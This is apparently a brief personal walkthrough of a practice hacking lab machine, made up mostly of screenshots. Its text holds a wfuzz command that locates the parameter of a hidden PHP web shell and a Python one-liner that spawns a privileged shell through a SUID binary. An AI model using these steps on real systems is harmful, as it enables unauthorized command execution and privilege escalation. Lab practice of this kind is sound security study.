- --
- Tags: #ejptmachine #wfuzz #reverseshell #python 
---

![Pasted image 20250305193857](../../Fotos/Pasted%20image%2020250305193857.png)

![Pasted image 20250305193927](../../Fotos/Pasted%20image%2020250305193927.png)

![Pasted image 20250305194909](../../Fotos/Pasted%20image%2020250305194909.png)

- /hidden/.shell.php


![Pasted image 20250305194025](../../Fotos/Pasted%20image%2020250305194025.png)

`wfuzz -c --hc=404 --hh=0 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://172.17.0.2/hidden/.shell.php?FUZZ=id"`

![Pasted image 20250305200117](../../Fotos/Pasted%20image%2020250305200117.png)

![Pasted image 20250305200123](../../Fotos/Pasted%20image%2020250305200123.png)

![Pasted image 20250305200417](../../Fotos/Pasted%20image%2020250305200417.png)

![Pasted image 20250305202114](../../Fotos/Pasted%20image%2020250305202114.png)

![Pasted image 20250305202153](../../Fotos/Pasted%20image%2020250305202153.png)

![Pasted image 20250305202209](../../Fotos/Pasted%20image%2020250305202209.png)

![Pasted image 20250305202429](../../Fotos/Pasted%20image%2020250305202429.png)

`python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

![Pasted image 20250305202627](../../Fotos/Pasted%20image%2020250305202627.png)


